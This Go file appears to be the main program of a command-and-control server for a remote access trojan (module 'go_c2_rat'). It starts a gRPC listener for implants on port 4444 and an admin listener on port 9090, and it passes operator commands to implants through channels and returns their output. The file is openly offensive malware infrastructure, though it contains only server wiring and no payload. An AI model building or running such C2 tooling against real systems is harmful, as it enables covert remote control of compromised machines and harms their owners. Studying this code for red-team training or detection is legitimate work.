package main

import (
	"fmt"
	"log"
	"net"

	"github.com/jonaserhart/go_c2_rat/internal/server"
	"github.com/jonaserhart/go_c2_rat/pb"
	"google.golang.org/grpc"
)

func main() {
	var (
		implantListener, adminListener net.Listener
		err                            error
		opts                           []grpc.ServerOption
		work, output                   chan *pb.Command
	)

	work, output = make(chan *pb.Command), make(chan *pb.Command)
	implant := server.NewImplantserver(work, output)
	admin := server.NewAdminServer(work, output)

	if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 4444)); err != nil {
		log.Fatal(err)
	}
	if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090)); err != nil {
		log.Fatal(err)
	}

	grpcAdminServer, grpcImplantServer := grpc.NewServer(opts...), grpc.NewServer(opts...)

	pb.RegisterImplantServer(grpcImplantServer, implant)
	pb.RegisterAdminServer(grpcAdminServer, admin)

	go func() {
		grpcImplantServer.Serve(implantListener)
	}()
	grpcAdminServer.Serve(adminListener)
}
